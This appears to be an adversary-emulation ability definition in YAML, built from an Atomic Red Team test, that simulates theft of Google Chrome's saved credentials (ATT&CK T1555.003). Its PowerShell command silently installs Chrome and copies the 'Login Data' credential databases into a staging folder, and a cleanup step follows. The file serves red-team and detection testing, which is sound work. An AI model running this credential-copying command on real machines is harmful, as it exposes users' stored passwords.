- id: 3d111226-d09a-4911-8715-fe11664f960d
  name: Simulating access to Chrome Login Data
  description: Simulates an adversary accessing encrypted credentials from Google
    Chrome Login database.
  tactic: credential-access
  technique:
    attack_id: T1555.003
    name: 'Credentials from Password Stores: Credentials from Web Browsers'
  platforms:
    windows:
      psh:
        command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
          {exit 0} else {exit 1}; then : ; else if (!(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi")){;
          $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi";
          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null;
          (New-Object Net.WebClient).DownloadFile("https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi","PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi");
          }; $path = Convert-Path -LiteralPath "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi";
          msiexec.exe /i "$path" /qn; Start-Sleep -Seconds 100; Start-Process -FilePath
          "C:\Program Files\Google\Chrome\Application\chrome.exe"; Stop-Process -Name
          "chrome"; fi; if ((Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
          Data") -and (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
          Data For Account")) {exit 0} else {exit 1}; then : ; else New-Item -Path
          "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -ItemType Directory
          -Force -ErrorAction SilentlyContinue; New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User
          Data\Default\Login Data" -ItemType File -Force -ErrorAction SilentlyContinue;
          New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
          Data For Account" -ItemType File -Force -ErrorAction SilentlyContinue; fi;
          Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
          -Destination "PathToAtomicsFolder\..\ExternalPayloads"; Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User
          Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"'
        cleanup: Get-Package -Name "Google Chrome" | Uninstall-Package -Force; Remove-Item
          -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction
          Ignore; Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login
          Data For Account" -Force -ErrorAction Ignore; Remove-Item -Path "$env:LOCALAPPDATA\Google"
          -Force -Recurse -ErrorAction Ignore; Remove-Item "#{installer_path}" -ErrorAction
          Ignore
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1555.003
  - credential-access
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      installer_path:
        description: where the installer will be downloaded to or already is located
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi
      download_url:
        description: url to install Chrome from
        type: url
        default: https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
    dependencies:
    - description: 'Chrome must be installed

        '
      prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
        -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
        {exit 0} else {exit 1}

        '
      get_prereq_command: "if (!(Test-Path \"#{installer_path}\")){\n  $parentpath\
        \ = Split-Path \"#{installer_path}\"\n  New-Item -Type Directory \"$parentpath\"\
        \ -ErrorAction Ignore -Force | Out-Null\n  (New-Object Net.WebClient).DownloadFile(\"\
        #{download_url}\",\"#{installer_path}\")\n}\n$path = Convert-Path -LiteralPath\
        \ \"#{installer_path}\"\nmsiexec.exe /i \"$path\" /qn\nStart-Sleep -Seconds\
        \ 100\nStart-Process -FilePath \"C:\\Program Files\\Google\\Chrome\\Application\\\
        chrome.exe\"\nStop-Process -Name \"chrome\"\n"
    - description: 'Chrome login data file must exist

        '
      prereq_command: if ((Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
        Data") -and (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
        Data For Account")) {exit 0} else {exit 1}
      get_prereq_command: 'New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
        -ItemType Directory -Force -ErrorAction SilentlyContinue

        New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        -ItemType File -Force -ErrorAction SilentlyContinue

        New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data
        For Account" -ItemType File -Force -ErrorAction SilentlyContinue

        '
